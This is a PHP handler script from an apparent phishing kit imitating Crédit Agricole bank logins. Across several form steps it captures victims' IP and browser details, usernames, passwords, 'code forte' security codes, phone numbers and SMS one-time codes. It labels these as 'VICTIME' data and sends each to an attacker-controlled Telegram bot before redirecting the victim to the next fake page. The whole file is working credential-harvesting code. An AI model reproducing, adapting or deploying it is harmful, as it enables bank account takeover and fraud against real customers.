<?php 

    require_once 'detect.php';
     


                              



$id="chatid";
$apiToken = "your-token";





//================
#==> CHOIX 
//================
if ($_POST['step']== 'index') {
    $khtar          = $_POST['khtar']; 
    $select         = $_POST['bobiz']; 
    $detect         = new BrowserDetection();
    $ip             = $_SERVER['REMOTE_ADDR'];
    $date           = date("Y-m-d H:i:s", time());
    $usragent       = $_SERVER['HTTP_USER_AGENT'];
    $browserName    = $detect->getName();
    $browserVer     = $detect->getVersion();
    $isMobile       = ($detect->isMobile()) ? 'Mobile' : 'Not mobile';
    $platformName   = $detect->getPlatform();
    

    if (empty($select)) {

        header("Location: index.php");
        exit();


    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  = $adrress . " | CHAISSE REGIONAL | AGRICOL "  . "\r\n" ;
        $message .= "CODE DEPARTEMENT: " . $khtar  . "\r\n";
        $message .= "CAISSE REGIONAL: " . $select  . "\r\n";
        $message .= "===| VICTIME detail |===: " . "\r\n";
        $message .= "IP: " . $ip  . "\r\n";
        $message .= "date: " . $date  . "\r\n";
        $message .= "USRAGENT: " . $usragent  . "\r\n";
        $message .= "BROWSERNAME: " . $browserName  . "\r\n";
        $message .= "SERVER: " . $browserVer  . "\r\n";
        $message .= "ISMOBILE: " . $isMobile  . "\r\n";
        $message .= "PLATEFORME: " . $platformName  . "\r\n";
 
       if(isset($_POST['submit']))
         {
            $apiToken;
            $data = [
                 'chat_id' => $id,
                 'text' => $subject . $message
            ];
            $response = file_get_contents("https://api.telegram.org/bot". $apiToken ."/sendMessage?" . http_build_query($data));
         }

        header("Location: user.php");
        exit();
    }
}


//================
#==> INDEx 
//================
if ($_POST['step']== 'user') {
    $indefiant = $_POST['indefient']; 
    

    if (empty($indefiant)) {

        header("Location: user.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  = $adrress . " | LOGIN | AGRICOL "  . "\r\n" ;
        $message .= "USER: " . $indefiant  . "\r\n";
 
       if(isset($_POST['submit']))
         {
            $apiToken;
            $data = [
                 'chat_id' => $id,
                 'text' => $subject . $message
            ];
            $response = file_get_contents("https://api.telegram.org/bot". $apiToken ."/sendMessage?" . http_build_query($data));
         }

        header("Location: password.php");
        exit();
    }
}


//================
#==> Email 
//================
if ($_POST['step']== 'pipsi') {
    $pass = $_POST['pass']; 
    

    if (empty($pass)) {

        header("Location: index.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  = $adrress . " | LOGIN | AGRICOL "  . "\r\n" ;
        $message .= "PASSWORD: " . $pass  . "\r\n";

       if(isset($_POST['submit']))
         {
            $apiToken;
            $data = [
                 'chat_id' => $id,
                 'text' => $subject . $message
            ];
            $response = file_get_contents("https://api.telegram.org/bot". $apiToken ."/sendMessage?" . http_build_query($data));
         }

        header("Location: loading.php");
        exit();
    }
}

//================
#==> CODE FORTE 
//================
if ($_POST['step']== 'forte') {
    $code_fort = $_POST['code_fort']; 
    

    if (empty($code_fort)) {

        header("Location: forte.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  = $adrress . " | LOGIN | AGRICOL "  . "\r\n" ;
        $message .= "CODE FORTE: " . $code_fort  . "\r\n";

       if(isset($_POST['submit']))
         {
            $apiToken;
            $data = [
                 'chat_id' => $id,
                 'text' => $subject . $message
            ];
            $response = file_get_contents("https://api.telegram.org/bot". $apiToken ."/sendMessage?" . http_build_query($data));
         }

        header("Location: loading_1.php");
        exit();
    }
}

//================
#==> NEMBER PHONE 
//================
if ($_POST['step']== 'number') {
    $num = $_POST['num']; 
    

    if (empty($num)) {

        header("Location: number.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  = $adrress . " | LOGIN | AGRICOL "  . "\r\n" ;
        $message .= "NUMBER PHONE " . $num  . "\r\n";

       if(isset($_POST['submit']))
         {
            $apiToken;
            $data = [
                 'chat_id' => $id,
                 'text' => $subject . $message
            ];
            $response = file_get_contents("https://api.telegram.org/bot". $apiToken ."/sendMessage?" . http_build_query($data));
         }

        header("Location: loading_2.php");
        exit();
    }
}


//================
#==> SMS 
//================
if ($_POST['step']== 'message') {
    $sms = $_POST['sms']; 
    

    if (empty($sms)) {

        header("Location: sms.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  = $adrress . " | SMS | AGRICOL "  . "\r\n" ;
        $message .= "CODE SMS: " . $sms  . "\r\n";

       if(isset($_POST['submit']))
         {
            $apiToken;
            $data = [
                 'chat_id' => $id,
                 'text' => $subject . $message
            ];
            $response = file_get_contents("https://api.telegram.org/bot". $apiToken ."/sendMessage?" . http_build_query($data));
         }

        header("Location: loading_4.php");
        exit();
    }
}